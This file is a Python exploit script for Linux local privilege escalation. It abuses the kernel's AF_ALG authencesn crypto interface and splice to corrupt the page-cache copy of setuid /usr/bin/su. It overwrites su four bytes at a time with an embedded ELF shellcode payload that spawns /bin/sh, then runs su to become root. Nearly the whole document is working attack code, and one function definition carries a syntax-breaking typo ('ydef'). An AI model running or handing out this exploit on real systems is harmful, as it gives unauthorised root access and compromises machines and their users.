import os
import socket
import sys
import errno

# default payload supplied by original authors
payload = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x001\xc01\xff\xb0i\x0f\x05H\x8d=\x0f\x00\x00\x001\xf6j;X\x99\x0f\x051\xffj<X\x0f\x05/bin/sh\x00\x00\x00"

if len(sys.argv) == 2: # custom payload is specified
    with open(sys.argv[1], 'rb') as elf: # read bytes of ELF
        payload = elf.read()
        print(f"Read in custom payload with size = {len(payload)} bytes")


ydef send(fd, offset, chunk): 
    conn.sendmsg(
        [b"A" * 4 + chunk],
        [
            (socket.SOL_ALG, 3, b'\x00' * 4),
            (socket.SOL_ALG, 2, b'\x10' + b'\x00' * 19),
            (socket.SOL_ALG, 4, b'\x08' + b'\x00' * 3)
        ],
        32768
    )

    print("Creating pipe...")
    rd, wr = os.pipe()

    os.splice(fd, wr, offset + 4, offset_src=0)
    print(f"'/usr/bin/su' -> pipe: {offset + 4} B xfered")
    os.splice(rd, conn.fileno(), offset + 4)
    print(f"pipe -> connection: {offset + 4} B xfered")

    try:
        '''
        this SHOULD error on purpose, see this explanation adapted from original authors:
            1. recv() triggers the decrypt operation. 
            2. Inside authencesn, the kernel reads the ESN bytes from the AAD and writes seqno_lo at dst[assoclen + cryptlen]. 
            3. The scatterwalk crosses from the output buffer into the chained page cache page. 
            4. Four bytes are written to the kernel's cached copy of /usr/bin/su. 
            5. The HMAC is computed over the rearranged data and fails. 
            6. The kernel reads seqno_lo back to restore the AAD, but the original bytes at the tag position are never restored. 
            7. recvmsg returns an error and the page cache is corrupted.
        '''
        conn.recv(8 + offset)
    except OSError as e:
        if e.errno is errno.EBADMSG:
            print(f"expected error: {e.strerror} @ offset = {offset}")
        else:
            raise # unexpected error, maybe something else happened?


# read setuid binary
su_fd = os.open("/usr/bin/su", os.O_RDONLY)
print(f"Opened '/usr/bin/su' with fd={su_fd}")

# setup algif_aead socket and bind to authencesn
sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
print("Created sequential packet socket with crypto algorithm address family")
sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
print("Binded socket to authencesn(HMAC(SHA256), CBC(AES)), algo type is authenticated encryption with associated data")

key = bytes.fromhex('0800010000000010' + '0' * 64)
sock.setsockopt(socket.SOL_ALG, 1, key)
print(f"Set socket level option: key = {key}")

sock.setsockopt(socket.SOL_ALG, 5, None, 4)
print(f"Set socket level option: AEAD length = 4 bytes")

# grab connection
conn, _ = sock.accept()
print(f"Connection established")

for offset in range(0, len(payload), 4):
    print(f"Sending 4B payload chunk to {conn}")
    send(su_fd, offset, payload[offset:offset+4])

# run the setuid binary after corrupting it
print("Corruption complete! Becoming root now...")
os.system("su")
